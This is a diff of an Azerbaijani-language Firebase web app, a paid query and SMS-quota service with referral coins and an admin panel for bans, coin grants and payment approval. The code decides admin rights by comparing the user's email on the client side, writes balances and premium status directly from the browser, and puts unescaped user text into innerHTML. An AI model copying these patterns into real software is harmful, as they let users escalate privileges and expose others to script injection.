-                                <div style="display: flex; justify-content: space-between; width: 100%; margin-bottom: 1rem;">
-                                    <div>
-                                        <strong>${p.username}</strong> - ${p.packageType}<br>
-                                        <small style="color: #8892b0;">${p.amount} AZN • ${new Date(p.createdAt).toLocaleString('az-AZ')}</small>
-                                    </div>
-                                    <div style="display: flex; gap: 0.5rem;">
-                                        <button class="small-btn success" onclick="approvePayment('${pid}', '${p.userId}', ${p.packageDays})">
-                                            <i class="fas fa-check"></i> Təsdiqlə
-                                        </button>
-                                        <button class="small-btn danger" onclick="rejectPayment('${pid}')">
-                                            <i class="fas fa-times"></i> Rədd Et
-                                        </button>
-                                    </div>
-                                </div>
-                                <img src="${p.receipt}" style="max-width: 100%; max-height: 300px; border-radius: 0.5rem; border: 1px solid rgba(255,255,255,0.1);">
-                            </div>
-                        `;
-                    });
-                    html += '</div>';
-                }
-                
-                document.getElementById('contentArea').innerHTML = html;
-            }, { onlyOnce: true });
-        }
-
-        window.approvePayment = async (pid, uid, days) => {
-            const premiumUntil = Date.now() + (days * 86400000);
-            await update(ref(db, `users/${uid}`), {
-                premiumUntil,
-                queriesRemaining: 999999,
-                smsQuotaRemaining: 999999
-            });
-            await update(ref(db, `payments/${pid}`), { status: 'approved', approvedAt: Date.now() });
-            
-            await push(ref(db, 'adminLogs'), {
-                action: `Ödəniş təsdiqləndi: ${pid}`,
-                admin: currentUser.email,
-                time: Date.now()
-            });
-            
-            showToast('Premium paket aktiv edildi!');
-            renderAdminPayments();
-        };
-
-        window.rejectPayment = async (pid) => {
-            await update(ref(db, `payments/${pid}`), { status: 'rejected' });
-            showToast('Ödəniş rədd edildi', 'error');
-            renderAdminPayments();
-        };
-
-        function renderAdminStats() {
-            onValue(ref(db, 'queryLogs'), (snapshot) => {
-                const logs = snapshot.val() || {};
-                const daily = {};
-                
-                Object.values(logs).forEach(log => {
-                    const day = new Date(log.timestamp).toLocaleDateString('az-AZ');
-                    daily[day] = (daily[day] || 0) + 1;
-                });
-                
-                const labels = Object.keys(daily).slice(-7);
-                const data = labels.map(l => daily[l]);
-                
-                document.getElementById('contentArea').innerHTML = `
-                    <div class="content-header">
-                        <h2><i class="fas fa-chart-bar"></i> İstifadə Statistikası</h2>
-                    </div>
-                    
-                    <div class="admin-card">
-                        <h3>Son 7 Günün Sorgu Sayı</h3>
-                        <div class="chart-container">
-                            <canvas id="statsChart"></canvas>
-                        </div>
-                    </div>
-                    
-                    <div class="admin-card">
-                        <h3>Ümumi Statistika</h3>
-                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-top: 1rem;">
-                            <div style="background: rgba(108, 92, 231, 0.2); padding: 1.5rem; border-radius: 1rem; text-align: center;">
-                                <div style="font-size: 2rem; font-weight: 800;">${Object.keys(logs).length}</div>
-                                <div style="color: #8892b0;">Ümumi Sorgu</div>
-                            </div>
-                            <div style="background: rgba(0, 206, 201, 0.2); padding: 1.5rem; border-radius: 1rem; text-align: center;">
-                                <div style="font-size: 2rem; font-weight: 800;">${Object.values(logs).filter(l => l.type === 'sms').length}</div>
-                                <div style="color: #8892b0;">SMS Göndərilib</div>
-                            </div>
-                            <div style="background: rgba(255, 165, 2, 0.2); padding: 1.5rem; border-radius: 1rem; text-align: center;">
-                                <div style="font-size: 2rem; font-weight: 800;">${Object.values(logs).filter(l => {
-                                    const d = new Date(l.timestamp);
-                                    const today = new Date();
-                                    return d.toDateString() === today.toDateString();
-                                }).length}</div>
-                                <div style="color: #8892b0;">Bugün</div>
-                            </div>
-                        </div>
-                    </div>
-                `;
-                
-                if (chartInstance) chartInstance.destroy();
-                const ctx = document.getElementById('statsChart').getContext('2d');
-                chartInstance = new Chart(ctx, {
-                    type: 'line',
-                    data: {
-                        labels,
-                        datasets: [{
-                            label: 'Günlük Sorgu Sayı',
-                            data,
-                            borderColor: '#6c5ce7',
-                            backgroundColor: 'rgba(108, 92, 231, 0.1)',
-                            tension: 0.4,
-                            fill: true
-                        }]
-                    },
-                    options: {
-                        responsive: true,
-                        maintainAspectRatio: false,
-                        plugins: {
-                            legend: { labels: { color: 'white' } }
-                        },
-                        scales: {
-                            y: {
-                                beginAtZero: true,
-                                ticks: { color: '#8892b0' },
-                                grid: { color: 'rgba(255,255,255,0.1)' }
-                            },
-                            x: {
-                                ticks: { color: '#8892b0' },
-                                grid: { color: 'rgba(255,255,255,0.1)' }
-                            }
-                        }
-                    }
-                });
-            }, { onlyOnce: true });
-        }
-
-        function renderAdminLogs() {
-            onValue(ref(db, 'adminLogs'), (snapshot) => {
-                const logs = snapshot.val() || {};
-                let html = `
-                    <div class="content-header">
-                        <h2><i class="fas fa-history"></i> Admin Logları</h2>
-                    </div>
-                    <div class="admin-card">
-                `;
-                
-                const logArray = Object.values(logs).sort((a, b) => b.time - a.time).slice(0, 50);
-                
-                if (logArray.length === 0) {
-                    html += '<p>Heç bir log tapılmadı.</p>';
-                } else {
-                    html += '<div style="font-family: monospace; font-size: 0.9rem;">';
-                    logArray.forEach(log => {
-                        html += `
-                            <div style="padding: 0.8rem; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                                <span style="color: var(--accent);">[${new Date(log.time).toLocaleString('az-AZ')}]</span>
-                                <span style="color: var(--warning);">${log.admin}:</span>
-                                <span>${log.action}</span>
-                            </div>
-                        `;
-                    });
-                    html += '</div>';
-                }
-                
-                html += '</div>';
-                document.getElementById('contentArea').innerHTML = html;
-            }, { onlyOnce: true });
-        }
-
-        function renderAdminAnnounce() {
-            document.getElementById('contentArea').innerHTML = `
-                <div class="content-header">
-                    <h2><i class="fas fa-bullhorn"></i> Elan Yarat</h2>
-                </div>
-                
-                <div class="admin-card">
-                    <div class="form-group">
-                        <label>Elan Mətni</label>
-                        <textarea id="announceText" rows="3" class="tool-input" style="width: 100%; resize: vertical;"></textarea>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>Şəkil (İstəyə bağlı)</label>
-                        <div class="file-input-wrapper">
-                            <input type="file" id="announceImage" accept="image/*">
-                            <label for="announceImage" class="file-input-label">
-                                <i class="fas fa-image"></i> Şəkil Seç
-                            </label>
-                        </div>
-                    </div>
-                    
-                    <button class="btn btn-primary" onclick="postAnnouncement()" style="width: auto;">
-                        <i class="fas fa-paper-plane"></i> Yayımla
-                    </button>
-                </div>
-            `;
-        }
-
-        window.postAnnouncement = async () => {
-            const text = document.getElementById('announceText').value;
-            const fileInput = document.getElementById('announceImage');
-            
-            if (!text) {
-                showToast('Mətn daxil edin!', 'error');
-                return;
-            }
-            
-            let imageUrl = null;
-            if (fileInput.files[0]) {
-                const reader = new FileReader();
-                await new Promise(resolve => {
-                    reader.onload = async (e) => {
-                        const imgRef = storageRef(storage, `announcements/${Date.now()}`);
-                        await uploadString(imgRef, e.target.result, 'data_url');
-                        imageUrl = await getDownloadURL(imgRef);
-                        resolve();
-                    };
-                    reader.readAsDataURL(fileInput.files[0]);
-                });
-            }
-            
-            await push(ref(db, 'announcements'), {
-                text,
-                imageUrl,
-                createdAt: Date.now(),
-                createdBy: currentUser.email
-            });
-            
-            await push(ref(db, 'adminLogs'), {
-                action: 'Yeni elan yayımlandı',
-                admin: currentUser.email,
-                time: Date.now()
-            });
-            
-            showToast('Elan yayımlandı!');
-            document.getElementById('announceText').value = '';
-            fileInput.value = '';
-        };
-
-        window.logout = async () => {
-            await signOut(auth);
-            showToast('Çıxış edildi!');
-        };
-
-        // Auth State
-        onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                currentUser = user;
-                isAdmin = user.email === 'cesicoder@gmail.com';
-                
-                // Get user data
-                const userRef = ref(db, `users/${user.uid}`);
-                const snap = await get(userRef);
-                
-                if (!snap.exists()) {
-                    // New user
-                    const refCode = document.getElementById('referralCode')?.value;
-                    const initialData = {
-                        email: user.email,
-                        username: user.email.split('@')[0],
-                        balance: 5000,
-                        queriesRemaining: 3,
-                        smsQuotaRemaining: 50,
-                        premiumUntil: 0,
-                        banned: false,
-                        favorites: [],
-                        referralEarnings: 0,
-                        createdAt: Date.now()
-                    };
-                    
-                    await set(userRef, initialData);
-                    
-                    // Handle referral
-                    if (refCode && refCode !== user.uid) {
-                        const refSnap = await get(ref(db, `users/${refCode}`));
-                        if (refSnap.exists()) {
-                            const refData = refSnap.val();
-                            await update(ref(db, `users/${refCode}`), {
-                                balance: (refData.balance || 0) + 500,
-                                referralEarnings: (refData.referralEarnings || 0) + 500
-                            });
-                            initialData.balance = 5500;
-                            await update(userRef, { balance: 5500 });
-                            showToast('Referans bonusu: +500 sikkə!');
-                        }
-                    }
-                    
-                    userData = initialData;
-                } else {
-                    userData = snap.val();
-                }
-                
-                // UI Setup
-                document.getElementById('authContainer').style.display = 'none';
-                document.getElementById('appContainer').style.display = 'flex';
-                
-                if (isAdmin) {
-                    document.getElementById('adminTabs').style.display = 'block';
-                    document.getElementById('userGreeting').innerHTML += ' <span class="admin-badge"><i class="fas fa-shield-alt"></i> ADMIN</span>';
-                }
-                
-                updateUI();
-                switchTab(isAdmin ? 'admin-users' : 'querytools');
-                
-                // Load announcements
-                onValue(ref(db, 'announcements'), (snap) => {
-                    const anns = snap.val() || {};
-                    const latest = Object.values(anns).sort((a, b) => b.createdAt - a.createdAt)[0];
-                    if (latest) {
-                        document.getElementById('announcementArea').innerHTML = `
-                            <div class="announcement-banner">
-                                <i class="fas fa-bullhorn"></i>
-                                <div>
-                                    <strong style="color: #ffa502;">Yeni Elan:</strong> ${latest.text}
-                                    ${latest.imageUrl ? '<br><img src="' + latest.imageUrl + '" style="max-height: 100px; margin-top: 0.5rem; border-radius: 0.5rem;">' : ''}
-                                </div>
-                            </div>
-                        `;
-                    }
-                });
-                
-            } else {
-                currentUser = null;
-                userData = null;
-                document.getElementById('authContainer').style.display = 'flex';
-                document.getElementById('appContainer').style.display = 'none';
-            }
-        });
-
-        // Auth Forms
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const email = document.getElementById('loginEmail').value;
-            const pass = document.getElementById('loginPassword').value;
-            
             try {
-                await signInWithEmailAndPassword(auth, email, pass);
-            } catch (err) {
+                await signInWithEmailAndPassword(auth, document.getElementById('loginEmail').value, document.getElementById('loginPassword').value);
+            } catch(err) {
                 document.getElementById('authError').style.display = 'block';
-                document.getElementById('authError').textContent = 'Giriş xətası: ' + err.message;
+                document.getElementById('authError').textContent = err.message;
             }
         });
 
         document.getElementById('registerForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const email = document.getElementById('registerEmail').value;
-            const pass = document.getElementById('registerPassword').value;
-            const username = document.getElementById('registerUsername').value;
-            
             try {
-                await createUserWithEmailAndPassword(auth, email, pass);
-                // User data will be created in onAuthStateChanged
-            } catch (err) {
+                const cred = await createUserWithEmailAndPassword(auth, document.getElementById('registerEmail').value, document.getElementById('registerPassword').value);
+                await set(ref(db, `users/${cred.user.uid}`), {
+                    email: cred.user.email,
+                    username: document.getElementById('registerUsername').value,
+                    balance: 5000, queriesRemaining: 3, smsQuotaRemaining: 50,
+                    premiumUntil: 0, banned: false, favorites: [], referralEarnings: 0,
+                    createdAt: Date.now()
+                });
+            } catch(err) {
                 document.getElementById('authError').style.display = 'block';
-                document.getElementById('authError').textContent = 'Qeydiyyat xətası: ' + err.message;
+                document.getElementById('authError').textContent = err.message;
             }
         });
+
+        window.logout = () => signOut(auth);
+
+        onAuthStateChanged(auth, async (user) => {
+            if(user) {
+                currentUser = user;
+                isAdmin = user.email === 'cesicoder@gmail.com';
+                const snap = await get(ref(db, `users/${user.uid}`));
+                
+                if(!snap.exists()) {
+                    // Google ilə ilk giriş
+                    await set(ref(db, `users/${user.uid}`), {
+                        email: user.email, username: user.displayName || user.email.split('@')[0],
+                        balance: 5000, queriesRemaining: 3, smsQuotaRemaining: 50,
+                        premiumUntil: 0, banned: false, favorites: [], referralEarnings: 0,
+                        createdAt: Date.now(), avatarUrl: user.photoURL || null
+                    });
+                }
+                
+                userData = (await get(ref(db, `users/${user.uid}`))).val();
+                document.getElementById('authContainer').style.display = 'none';
+                document.getElementById('appContainer').style.display = 'flex';
+                if(isAdmin) document.getElementById('adminTabs').style.display = 'block';
+                updateUI();
+                switchTab('querytools');
+            } else {
+                currentUser = null;
+                document.getElementById('authContainer').style.display = 'flex';
+                document.getElementById('appContainer').style.display = 'none';
+            }
+        });
+
+        // Admin funksiyaları (qısaldılmış)
+        window.renderAdminUsers = async () => {
+            const snap = await get(ref(db, 'users'));
+            const users = snap.val() || {};
+            let html = `<div class="content-header"><h2>İstifadəçilər</h2></div><div class="admin-card">`;
+            for(let [uid,u] of Object.entries(users)) {
+                html += `<div class="user-row">
+                    <div><b>${u.username}</b> ${u.banned ? '<span style="color:red">(BAN)</span>' : ''}<br><small>${u.email}</small></div>
+                    <div>Balans: ${u.balance || 0}</div>
+                    <div>
+                        <button class="small-btn danger" onclick="toggleBan('${uid}', ${!u.banned})">${u.banned ? 'Aç' : 'Ban'}</button>
+                        <button class="small-btn success" onclick="addCoin('${uid}')">+Sikkə</button>
+                    </div>
+                </div>`;
+            }
+            html += '</div>';
+            document.getElementById('contentArea').innerHTML = html;
+        };
+
+        window.toggleBan = async (uid, status) => {
+            await update(ref(db, `users/${uid}`), { banned: status });
+            showToast(status ? 'Banlandı' : 'Açıldı');
+            renderAdminUsers();
+        };
+
+        window.addCoin = async (uid) => {
+            const amt = parseInt(prompt('Miqdar:'));
+            if(amt) {
+                const u = await get(ref(db, `users/${uid}`));
+                await update(ref(db, `users/${uid}`), { balance: (u.val()?.balance || 0) + amt });
+                renderAdminUsers();
+            }
+        };
+
+        window.renderAdminPayments = async () => {
+            const snap = await get(ref(db, 'payments'));
+            const pays = snap.val() || {};
+            let html = `<div class="content-header"><h2>Ödənişlər</h2></div>`;
+            for(let [pid,p] of Object.entries(pays).filter(x => x[1].status === 'pending')) {
+                html += `<div class="admin-card">
+                    <b>${p.username}</b> - ${p.packageType} (${p.amount} AZN)
+                    <br><small>${new Date(p.createdAt).toLocaleString()}</small>
+                    <br><button class="small-btn success" onclick="approvePay('${pid}', '${p.userId}', ${p.days})">Təsdiqlə</button>
+                </div>`;
+            }
+            document.getElementById('contentArea').innerHTML = html || '<div class="admin-card">Gözləyən yoxdur</div>';
+        };
+
+        window.approvePay = async (pid, uid, days) => {
+            await update(ref(db, `users/${uid}`), { 
+                premiumUntil: Date.now() + days*86400000,
+                queriesRemaining: 999999, smsQuotaRemaining: 999999
+            });
+            await update(ref(db, `payments/${pid}`), { status: 'approved' });
+            showToast('Təsdiqləndi!');
+            renderAdminPayments();
+        };
     </script>
 </body>
 </html>
